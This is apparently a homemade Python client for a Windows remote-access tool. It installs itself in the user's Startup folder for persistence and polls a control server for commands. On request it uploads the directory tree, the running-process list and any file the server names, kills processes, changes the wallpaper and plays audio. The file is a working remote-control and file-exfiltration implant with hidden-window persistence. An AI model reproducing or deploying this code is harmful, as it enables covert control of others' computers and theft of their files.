#maybe shutdown/restart with os.system('shutdown /s or shutdown /r')
#need thread for sound cause takes time to resolve+lets me play multiple times (impossible?)
#C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup



#change me to .pyw
#if you are running this remember to remove it from startup.

import winsound
import os
import requests
import threading
import time
import ctypes

host = 'http://192.168.1.15:5000'
user = os.path.expanduser('~')

#copy file to startup
startup = os.path.join(user, 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Python.pyw')
with open(startup, "w") as newfile, open('client.py') as program:
	for line in program:
		newfile.write(line)
os.chdir(user)

def listen():
	while True:
		print('%s/control' %(host))
		req = requests.get('%s/control' %(host))
		print(req.text)
		control(req.text)

		
		
		
def control(req):
	if req == 'wallpaper':
		wallpaper = requests.post('%s/control2' %(host), data = 'Wallpaper link')
		r = requests.get(wallpaper.text)
		image = os.path.join(user, 'Downloads\cula4_garfield1.jpg')
		if r.status_code == 200:
			with open(image, 'wb') as f:
				for chunk in r:
					f.write(chunk)
		ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 0)
	if req == 'song':
		song = requests.post('%s/control2' %(host), data = 'Song link')
		r = requests.get(song.text)
		sound = os.path.join(user, 'Windows.wav')
		if r.status_code == 200:
			with open(sound, 'wb') as f:
				for chunk in r:
					f.write(chunk)
		winsound.PlaySound('Windows.wav', winsound.SND_FILENAME)
	if req == 'beep':
		t = threading.Thread(target=winsound.Beep, args=(7000, 5000))
		t.start()
		# winsound.Beep(7000, 5000)
	if req == 'tree':
		os.system('tree /F> tree.txt')
		files={'file': ('tree.txt', open('tree.txt', 'rb'))}
		r = requests.post('%s/upload' %(host), files=files)
		print(r.text)
	if req == 'tasklist':
		os.system('tasklist> tasklist.txt')
		files={'file': ('tasklist.txt', open('tasklist.txt', 'rb'))}
		r = requests.post('%s/upload' %(host), files=files)
		print(r.text)
	if req == 'file':
		filePath = requests.post('%s/control2' %(host), data = 'File path')
		f = open(filePath.text, 'rb')
		files = files = {'file': f}
		r = requests.post('%s/upload' %(host), files=files)
		print(r.text)
	if req == 'taskkill':
		task = requests.post('%s/control2' %(host), data = 'PID')
		os.system('taskkill /PID %s /F' %(task.text))
		print('Task killed.')

		
if __name__ == '__main__':		
	listen()

